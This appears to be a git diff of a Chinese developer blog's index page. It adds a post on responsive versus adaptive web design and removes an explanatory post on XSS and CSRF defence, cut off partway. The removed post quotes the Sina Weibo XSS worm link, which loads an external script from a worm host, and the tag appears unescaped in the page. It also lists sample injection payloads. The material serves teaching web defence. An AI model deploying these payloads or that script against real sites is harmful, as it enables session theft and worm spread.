@@ -183,6 +183,94 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/the-difference-between-responsive-and-adaptive/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/the-difference-between-responsive-and-adaptive/" class="post-title-link" itemprop="url">响应式与自适应的区别</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-11-06 08:14:09" itemprop="dateCreated datePublished" datetime="2014-11-06T08:14:09+08:00">2014-11-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%A8%8B%E5%BA%8F%E4%B8%8E%E7%94%9F%E6%B4%BB/" itemprop="url" rel="index">
+                    <span itemprop="name">程序与生活</span>
+                  </a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%A8%8B%E5%BA%8F%E4%B8%8E%E7%94%9F%E6%B4%BB/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/" itemprop="url" rel="index">
+                    <span itemprop="name">经验分享</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><a href="http://storage.veitor.net/uploads/2014/11/6310d41cjw1em0lsear2xg20b408cn22.gif" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/11/6310d41cjw1em0lsear2xg20b408cn22.gif" alt="6310d41cjw1em0lsear2xg20b408cn22"></a></p>
+<p>起初，网页设计者都会设计固定宽度的页面，最开始的电脑显示器分辨率种类不多，因为当时电脑本来就少，即使有变化也是 800 850 870 880。 后来随着显示器越来越多，以及笔记本的普及，这种方式的页面出现了问题。于是出现了一种新的布局方式<strong>宽度自适应布局</strong>。我们平时谈论的自适应布局，大多指的就是宽度自适应布局。 在这种布局下，出现了两派：</p>
+<ul>
+<li>百分比宽度布局</li>
+<li>流式布局</li>
+</ul>
+<p>题主说的是第一派，宽度使用百分比，文字使用em。第二派的布局以 iGoogle 为代表（已经停止）。 再后来，浏览器大战 时代，firefox、Oparo、Chrome …… 出现，结束了 IE 一统江湖的局面，N 年没有更新的 IE6 发布了新版本，以前已 IE 为标准的 CSS 向 W3C 标准趋近，随后各种针对浏览器的 <a href="http://baike.baidu.com/view/1119452.htm" target="_blank" rel="noopener">css hack</a> 技术出现。 虽然浏览器这么多，但是<strong>响应式布局</strong>依然不是主流，人们还在使用 css hack 技术。注意我的用词——「不是主流」，虽然不是主流，不代表当时不被使用。 比如一向超前的伟大的 Google。当时没有响应式布局这个词语，但是慢慢出现了一个词——<strong>渐进增强</strong>，新词的出现总是伴随的旧词一起出现。就好比 3G 出现之前，没人管自己的手机叫 2G，所以，3G 和 2G 两个词是一起出现的（技术上当然2G技术先出现）。同理，渐进增强出现后，另一个词「优雅降级」也随之出现了。 词的意思可以自己看 wiki、Google，我只在这儿举一个例子，gmail 和 qqmail。 他俩的宽度都是 100%，都是自适应。但是： qqmail 就是 css hack 的完美体现，你用任何一个浏览器，几乎可以看到同一个样子的邮箱，腾讯的前端工程师们用各种 css hack 技术来展示邮箱页面，为的是<strong>统一的用户体验</strong>。 而 gmail 使用了<strong>渐进增强</strong>，你的浏览器越强，你看到的效果就越好，用户体验就越好。 再后来，就是大家都熟知的 Google 发布了 android，于是互联网大战从 PC 打到了手机。还有 HTML5 标准的发布。 手机虽然屏幕变小了，但是却提供了更丰富的功能。还记得以前用诺基亚上 QQ 的事儿吗？我们访问的是 3g.qq.com，当时我使用的是中兴的手机，访问 wap.qq.com，在后来的职能手机都是访问 m.qq.com。 不禁有人问「真的需要为每个手机分别设计一个网页吗？」、「真的需要为手机和电脑设计不同的网页吗？」，解决方法当然有很多种，可以看看 <a href="http://www.csszengarden.com/" target="_blank" rel="noopener">css zen garden</a> 相信做过前端的都看过这个网站，一个神奇的网站。 最终的解决方案胜出者是<strong>响应式布局</strong>。 响应式布局被大家熟知的一个重要原因就是 twitter 开源了 bootstrap。Google 第一次完成了<strong>从先驱到烈士</strong>。 好了，上面介绍的是从从“自适应”到“响应式”，以下 Responsive design ＝ RWD，Adaptive design ＝ AWD。 先说共同点，两者都是因为越来越多的 移动设备（ mobile, tablet device ）加入到互联网中来而出现的为移动设备提供更好的体验的技术。用技术来使网页适应从小到大（现在到超大）的不同分辨率的屏幕。有人说，RWD 是 AWD 包含的一个子集。 RWD：Ethan Marcote 的文章是大家认为 RWD 的起源。他提出的 RWD 是采用 CSS 的 media query 技术，配合流体布局（ fluid grids ）和同样可以自适应的图片/视频等资源素材。以上所说，都是通过 HTML 和 CSS 就能完成的。一般来说，RWD 倾向于只改变元素的外观布局，而不大幅度改变内容。Jeffrey Zeldman 总结说，我们就把 RWD 定义为一切能用来为各种分辨率和设备性能优化<strong>视觉体验</strong>的技术吧。 AWD：Adaptive Design 是 Aaron Gustafson 的书的标题。他认为 AWD 在包括 RWD 的 CSS media query 技术以外，也要用 Javascript 来操作 HTML 来更适应移动设备的能力。AWD 有可能会针对移动端用户减去内容，减去功能。AWD 可以在服务器端就进行优化，把优化过的内容送到终端上。AWD 通常会牵扯到另外一个词 “progressive enhancement” 。 progressive enhancement（渐进增强）：从针对最低端的，最低分辨率的设备的设计做起，逐步逐步为更高阶的设备增加功能和效果的做法。（换个角度说，也就是相当于为移动设备减去功能） RWD 和 AWD 在断点（ break point ）的区别： RWD 采用流体＋断点，在断点之间，页面依然会随窗口大小自动缩放（通过 fluid grid ），直到遇到断点改变界面样式。相对的，AWD 只在针对几种分辨率（如1280，800，640，320px）进行优化，在断点之间的自动过渡比较少。 还有一种说法： RWD 一般来说需要在网页设计初期就开始（通常采用 mobile first 策略），所以旧的网站要做 RWD 很可能要完全重建。而 AWD 则采用保留现有桌面网站（ desktop version ）而对于更小的分辨率做针对性的优化（适应），这点对于很多老的网站来说很重要，因为重构成本太大。 另外，对于 mobile 用户的优化到底应该怎么做，有两方的说法各不相让。有人说，不应该因为用户使用的是 mobile device 就删去内容，限制他们的功能，应该平等对待。也有人说，正因为是移动设备，有其流量，性能，网速的局限性，用移动设备登录网站的目的也会更有针对性，要为 用户精简文字，精简最常用的功能放在首页，服务器端的优化才是真的针对 mobile 的优化。 最后： 在网上的各种说法里确实是有很多相互干扰相互矛盾的地方，但是其实技术都是摆在那里的。其实可以认为，AWD 在针对布局的优化中，可以采用 RWD 的策略，但是AWD 着力于更多其他的 JS 或者服务器上的优化，来强化移动端体验。 不用纠结于词汇，根据网站功能复杂度，预算和资源等，选择要使用的技术，从客户端的展现，到 JS，到服务器的优化等等。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/installation-and-usage-of-tool-xhprof/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -214,7 +302,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -312,7 +400,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -443,7 +531,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -525,7 +613,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -727,7 +815,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -831,7 +919,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -921,7 +1009,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1015,7 +1103,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1099,7 +1187,7 @@ echo '<a href="/xhprof\_html/index.php?run='.$run\_id.'&source=xhprof\_foo" targ
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
+                <time title="修改时间：2020-05-25 15:22:06" itemprop="dateModified" datetime="2020-05-25T15:22:06+08:00">2020-05-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1178,245 +1266,6 @@ background-size: 100px auto;
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/taling-about-XSS-and-CSRF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpg">
-      <meta itemprop="name" content="Veitor">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Veitor的技术点滴">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/posts/taling-about-XSS-and-CSRF/" class="post-title-link" itemprop="url">浅谈XSS和CSRF</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2014-08-24 14:03:34" itemprop="dateCreated datePublished" datetime="2014-08-24T14:03:34+08:00">2014-08-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%A8%8B%E5%BA%8F%E4%B8%8E%E7%94%9F%E6%B4%BB/" itemprop="url" rel="index">
-                    <span itemprop="name">程序与生活</span>
-                  </a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%A8%8B%E5%BA%8F%E4%B8%8E%E7%94%9F%E6%B4%BB/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/" itemprop="url" rel="index">
-                    <span itemprop="name">经验分享</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="同源策略（Same-Origin-Policy）"><a href="#同源策略（Same-Origin-Policy）" class="headerlink" title="同源策略（Same Origin Policy）"></a>同源策略（Same Origin Policy）</h3><p>同源策略阻止从一个源加载的文档或脚本获取或设置另一个源加载的文档的属性。</p>
-<p>如：</p>
-<p>不能通过Ajax获取另一个源的数据；</p>
-<p>JavaScript不能访问页面中iframe加载的跨域资源。</p>
-<p>对 <a href="http://store.company.com/dir/page.html" target="_blank" rel="noopener">http://store.company.com/dir/page.html</a> 同源检测</p>
-<p><a href="http://storage.veitor.net/uploads/2014/08/28230050-d605bfba1f1b48e081353243800c253c.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28230050-d605bfba1f1b48e081353243800c253c.png" alt="28230050-d605bfba1f1b48e081353243800c253c"></a></p>
-<h3 id="跨域限制"><a href="#跨域限制" class="headerlink" title="跨域限制"></a>跨域限制</h3><ol>
-<li>浏览器中，script、img、iframe、link等标签，可以跨域引用或加载资源。</li>
-<li>不同于 XMLHttpRequest，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。</li>
-<li>XMLHttpRequest 也受到也同源策略的约束，不能跨域访问资源。</li>
-</ol>
-<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>为了解决 XMLHttpRequest 同源策略的局限性，JSONP出现了。</p>
-<p>JSONP并不是一个官方的协议，它是利用script标签中src属性具有跨域加载资源的特性，而衍生出来的跨域数据访问方式。</p>
-<h3 id="CORS-Cross-Origin-Resource-Sharing"><a href="#CORS-Cross-Origin-Resource-Sharing" class="headerlink" title="CORS(Cross-Origin Resource Sharing)"></a>CORS(Cross-Origin Resource Sharing)</h3><p>CORS，即：<strong>跨域资源共享</strong>。</p>
-<p>这是W3C委员会制定的一个新标准，用于解决 XMLHttpRequest 不能跨域访问资源的问题。目前支持情况良好（特指移动端）。</p>
-<p>想了解更多，可查看之前的文章：<a href="http://www.cnblogs.com/maplejan/archive/2012/12/02/2797864.html" target="_blank" rel="noopener">《CORS(Cross-Origin Resource Sharing) 跨域资源共享》</a></p>
-<hr>
-<h2 id="XSS（Cross-Site-Script）"><a href="#XSS（Cross-Site-Script）" class="headerlink" title="XSS（Cross Site Script）"></a>XSS（Cross Site Script）</h2><p>XSS（Cross Site Script） 即：<strong>跨站脚本攻击</strong>。</p>
-<p>本来缩写其应该是CSS，不过为了避免和CSS层叠样式表 （Cascading Style Sheets）重复，所以在安全领域叫做 XSS 。</p>
-<h3 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h3><p>XSS 主要分为两种形态</p>
-<ol>
-<li>反射型XSS（非持久型XSS）。需要诱惑用户去激活的XSS攻击，如：点击恶意链接。</li>
-<li>存储型XSS。混杂有恶意代码的数据被存储在服务器端，当用户访问输出该数据的页面时，就会促发XSS攻击。具有很强的稳定性。</li>
-</ol>
-<h3 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload</h3><p>XSS Payload，是指那些用于完成各种具体功能的恶意脚本。</p>
-<p>由于实现XSS攻击可以通过JavaScript、ActiveX控件、Flash插件、Java插件等技术手段实现，下面只讨论JavaScript的XSS Payload。</p>
-<p>通过JavaScript实现的XSS Payload，一般有以下几种：</p>
-<ol>
-<li>Cookie劫持</li>
-<li>构造请求</li>
-<li>XSS钓鱼</li>
-<li>CSS History Hack</li>
-</ol>
-<h3 id="Cookie劫持"><a href="#Cookie劫持" class="headerlink" title="Cookie劫持"></a>Cookie劫持</h3><p>由于Cookie中，往往会存储着一些用户安全级别较高的信息，如：用户的登陆凭证。</p>
-<p>当用户所访问的网站被注入恶意代码，它只需通过 _document.cookie _这句简单的JavaScript代码，就可以顺利获取到用户当前访问网站的cookies。</p>
-<p>如果攻击者能获取到用户登陆凭证的Cookie，甚至可以绕开登陆流程，直接设置这个cookie的值，来访问用户的账号。</p>
-<h3 id="构造请求"><a href="#构造请求" class="headerlink" title="构造请求"></a>构造请求</h3><p>JavaScript 可以通过多种方式向服务器发送GET与POST请求。</p>
-<p>网站的数据访问和操作，基本上都是通过向服务器发送请求而实现的。</p>
-<p>如果让恶意代码顺利模拟用户操作，向服务器发送有效请求，将对用户造成重大损失。</p>
-<p>例如：更改用户资料、删除用户信息等…</p>
-<h3 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h3><p>关于网站钓鱼，详细大家应该也不陌生了。</p>
-<p>就是伪造一个高度相似的网站，欺骗用户在钓鱼网站上面填写账号密码或者进行交易。</p>
-<p>而XSS钓鱼也是利用同样的原理。</p>
-<p>注入页面的恶意代码，会弹出一个想死的弹窗，提示用户输入账号密码登陆。</p>
-<p>当用户输入后点击发送，这些资料已经去到了攻击者的服务器上了。</p>
-<p>如：</p>
-<p><a href="http://storage.veitor.net/uploads/2014/08/28231056-882bbad839274f95a635ddbd128db3c4.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28231056-882bbad839274f95a635ddbd128db3c4.png" alt="28231056-882bbad839274f95a635ddbd128db3c4"></a></p>
-<h3 id="CSS-History-Hack"><a href="#CSS-History-Hack" class="headerlink" title="CSS History Hack"></a>CSS History Hack</h3><p>CSS History Hack是一个有意思的东西。它结合 浏览器历史记录 和 CSS的伪类：a:visited，通过遍历一个网址列表来获取其中<a>标签的颜色，就能知道用户访问过什么网站。</p>
-<p>相关链接：</p>
-<p>PS：目前最新版的Chrome、Firefox、Safari已经无效，Opera 和 IE8以下 还可以使用。</p>
-<h3 id="XSS-Worm"><a href="#XSS-Worm" class="headerlink" title="XSS Worm"></a>XSS Worm</h3><p>XSS Worm，即XSS蠕虫，是一种具有自我传播能力的XSS攻击，杀伤力很大。</p>
-<p>引发 XSS蠕虫 的条件比较高，需要在用户之间发生交互行为的页面，这样才能形成有效的传播。一般要同时结合 反射型XSS 和 存储型XSS 。</p>
-<p>案例：Samy Worm、新浪微博XSS攻击</p>
-<h3 id="新浪微博XSS攻击"><a href="#新浪微博XSS攻击" class="headerlink" title="新浪微博XSS攻击"></a>新浪微博XSS攻击</h3><p>这张图，其实已经是XSS蠕虫传播阶段的截图了。</p>
-<p>攻击者要让XSS蠕虫成功被激活，应该是通过 私信 或者 @微博 的方式，诱惑一些微博大号上当。</p>
-<p>当这些大号中有人点击了攻击链接后，XSS蠕虫就被激活，开始传播了。</p>
-<p><a href="http://storage.veitor.net/uploads/2014/08/28231427-6c93f6962f234f0a8576b1a8979da50e.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28231427-6c93f6962f234f0a8576b1a8979da50e.png" alt="28231427-6c93f6962f234f0a8576b1a8979da50e"></a></p>
-<p>这个XSS的漏洞，其实就是没有对地址中的变量进行过滤。</p>
-<p>把上一页的链接decode了之后，我们就可以很容易的看出，这个链接的猫腻在哪里。</p>
-<p>链接上带的变量，直接输出页面，导致外部JavaScript代码成功注入。</p>
-<p>传播链接：<a href="http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update" target="_blank" rel="noopener">http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</a></p>
-<p>把链接decode之后：<a href="http://weibo.com/pub/star/g/xyyyd&quot;&gt;" target="_blank" rel="noopener">http://weibo.com/pub/star/g/xyyyd&quot;&gt;</a><script src=//www.2kt.cn/images/t.js></script>?type=update</p>
-<p><a href="http://storage.veitor.net/uploads/2014/08/28231439-beba435e8f8f4a97acdeee43ad981aef-1.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28231439-beba435e8f8f4a97acdeee43ad981aef-1.png" alt="28231439-beba435e8f8f4a97acdeee43ad981aef (1)"></a></p>
-<p>相关XSS代码这里就不贴了，Google一下就有。</p>
-<p>其实也要感谢攻击者只是恶作剧了一下，让用户没有造成实际的损失。</p>
-<p>网上也有人提到，如果这个漏洞结合XSS钓鱼，再配合隐性传播，那样杀伤力会更大。</p>
-<hr>
-<h2 id="XSS-防御技巧"><a href="#XSS-防御技巧" class="headerlink" title="XSS 防御技巧"></a>XSS 防御技巧</h2><h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><p>服务器端在设置安全级别高的Cookie时，带上HttpOnly的属性，就能防止JavaScript获取。</p>
-<p>PHP设置HttpOnly：</p>
-<p>&lt;?<br>header(“Set-Cookie: a=1;”, false);<br>header(“Set-Cookie: b=1;httponly”, false);<br>setcookie(“c”, “1”, NULL, NULL, NULL, NULL, ture);</p>
-<p>PS：手机上的QQ浏览器4.0，居然不支持httponly，而3.7的版本却没问题。测试平台是安卓4.0版本。</p>
-<p>估计是一个低级的bug，已经向QQ浏览器那边反映了情。</p>
-<p>截止时间：2013-01-28</p>
-<h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p><strong>任何用户输入的数据，都是“不可信”的。</strong></p>
-<p>输入检查，一般是用于输入格式检查，例如：邮箱、电话号码、用户名这些…</p>
-<p>都要按照规定的格式输入：电话号码必须纯是数字和规定长度；用户名除 中英文数字 外，仅允许输入几个安全的符号。</p>
-<p>输入过滤不能完全交由前端负责，前端的输入过滤只是为了避免普通用户的错误输入，减轻服务器的负担。</p>
-<p>因为攻击者完全可以绕过正常输入流程，直接利用相关接口向服务器发送设置。</p>
-<p>所以，前端和后端要做相同的过滤检查。</p>
-<h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><p>相比输入检查，前端更适合做输出检查。</p>
-<p>可以看到，HttpOnly和前端没直接关系，输入检查的关键点也不在于前端。</p>
-<p>那XSS的防御就和前端没关系了?</p>
-<p>当然不是，随着移动端web开发发展起来了，Ajax的使用越来越普遍，越来越多的操作都交给前端来处理。</p>
-<p>前端也需要做好XSS防御。</p>
-<p>JavaScript直接通过Ajax向服务器请求数据，接口把数据以JSON格式返回。前端整合处理数据后，输出页面。</p>
-<p>所以，前端的XSS防御点，在于输出检查。</p>
-<p>但也要结合<strong>XSS可能发生的场景</strong>。</p>
-<h3 id="XSS注意场景"><a href="#XSS注意场景" class="headerlink" title="XSS注意场景"></a>XSS注意场景</h3><p><strong>在HTML标签中输出</strong></p>
-<p>如：<a href=# >{$var}</a></p>
-<p>风险：{$var} 为 <img src=# onerror="/xss/" /></p>
-<p>防御手段：变量HtmlEncode后输出</p>
-<p><strong>在HTML属性中输出</strong></p>
-<p>如：<div data-num="{$var}"></div></p>
-<p>风险：{$var} 为 “ onclick=”/xss/</p>
-<p>防御手段：变量HtmlEncode后输出</p>
-<p><strong>在<script>标签中输出</strong></p>
-<p>如：<script>var num = {$var};</script></p>
-<p>风险：{$var} 为 1; alert(/xss/)</p>
-<p>防御手段：确保输出变量在引号里面，再让变量JavaScriptEncode后输出。</p>
-<p><strong>在事件中输出</strong></p>
-<p>如：<span onclick="fun({$var})">hello!click me!</span></p>
-<p>风险：{$var} 为 ); alert(/xss/); //</p>
-<p>防御手段：确保输出变量在引号里面，再让变量JavaScriptEncode后输出。</p>
-<p><strong>在CSS中输出</strong></p>
-<p>一般来说，尽量禁止用户可控制的变量在<style>标签和style属性中输出。</p>
-<p><strong>在地址中输出</strong></p>
-<p>如：<a href="http://3g.cn/?test={$var}" target="_blank" rel="noopener"></p>
-<p>风险：{$var} 为 “ onclick=”alert(/xss/)</p>
-<p>防御手段：对URL中除 协议(Protocal) 和 主机(Host) 外进行URLEncode。如果整个链接都由变量输出，则需要判断是不是http开头。</p>
-<h3 id="HtmlEncode"><a href="#HtmlEncode" class="headerlink" title="HtmlEncode"></a>HtmlEncode</h3><p>对下列字符实现编码</p>
-<p>&amp;     ——》    &amp;</p>
-<p>&lt;     ——》    &lt;</p>
-<blockquote>
-<pre><code>——》    &amp;gt;</code></pre></blockquote>
-<p>“    ——》    &quot;</p>
-<p>‘    ——》    &#39; （IE不支持&apos;）</p>
-<p>/      ——》    &#x2F;</p>
-<h3 id="JavaScriptEncode"><a href="#JavaScriptEncode" class="headerlink" title="JavaScriptEncode"></a>JavaScriptEncode</h3><p>对下列字符加上反斜杠</p>
-<p>“    ——》    \“</p>
-<p>‘    ——》    \‘</p>
-<p>\      ——》    \\</p>
-<p>\n    ——》    \\n</p>
-<p>\r     ——》    \\r      (Windows下的换行符)</p>
-<p>例子： “\&quot;.replace(/\/g, “\\\“);  //return \\</p>
-<p>推荐一个JavaScript的模板引擎：<a href="http://aui.github.com/artTemplate/%20" target="_blank" rel="noopener"><strong>artTemplate</strong></a></p>
-<h3 id="URLEncode"><a href="#URLEncode" class="headerlink" title="URLEncode"></a>URLEncode</h3><p>使用以下JS原生方法进行URI编码和解码：</p>
-<ul>
-<li>encodeURI</li>
-<li>decodeURI</li>
-<li>decodeURIComponent</li>
-<li>encodeURIComponent</li>
-</ul>
-<hr>
-<h2 id="CSRF（Cross-site-request-forgery）"><a href="#CSRF（Cross-site-request-forgery）" class="headerlink" title="CSRF（Cross-site request forgery）"></a>CSRF（Cross-site request forgery）</h2><p><a href="http://storage.veitor.net/uploads/2014/08/28232804-51bdd6fb20674c99a3af90124348859c.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/08/28232804-51bdd6fb20674c99a3af90124348859c.png" alt="28232804-51bdd6fb20674c99a3af90124348859c"></a></p>
-<p>CSRF 即：<strong>跨站点请求伪造</strong></p>
-<p>网站A ：为恶意网站。</p>
-<p>网站B ：用户已登录的网站。</p>
-<p>当用户访问 A站 时，A站 私自访问 B站 的操作链接，模拟用户操作。</p>
-<p>假设B站有一个删除评论的链接：<a href="http://b.com/comment/?type=delete&amp;id=81723" target="_blank" rel="noopener">http://b.com/comment/?type=delete&amp;id=81723</a></p>
-<p>A站 直接访问该链接，就能删除用户在 B站 的评论。</p>
-<h3 id="CSRF-的攻击策略"><a href="#CSRF-的攻击策略" class="headerlink" title="CSRF 的攻击策略"></a>CSRF 的攻击策略</h3><p>因为浏览器访问 B站 相关链接时，会向其服务器发送 B站 保存在本地的Cookie，以判断用户是否登陆。所以通过 A站 访问的链接，也能顺利执行。</p>
-<hr>
